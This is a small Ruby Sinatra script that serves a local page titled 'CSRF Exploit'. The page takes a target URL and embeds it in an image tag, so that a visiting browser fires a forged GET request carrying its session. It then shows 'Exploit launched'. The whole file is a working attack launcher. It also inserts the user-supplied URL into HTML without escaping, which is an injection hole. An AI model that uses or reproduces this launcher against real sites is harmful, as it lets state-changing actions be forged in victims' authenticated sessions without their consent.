#!/usr/bin/env ruby

require 'base64'
require 'sinatra'
require 'json'

set :bind, '127.0.0.1'
set :port, '4000'

get '/' do
  response = <<-HEREDOC
    <html>
        <body>
            <h2>CSRF Exploit</h2>
            <form action="/exploit" method="get">
                URL: <input type="text" name="url" style="width:50%"><br/><br/>
                <button type="submit">Exploit</button>
            </form>
        </body>
    </html>
  HEREDOC

  response
end

get '/exploit' do
  response = <<-HEREDOC
    <html>
        <body>
            <img src="#{params[:url]}" alt="" />

            <h2>Success!</h2>
            <p>Exploit launched.</p>
        </body>
    </html>
  HEREDOC

  response
end
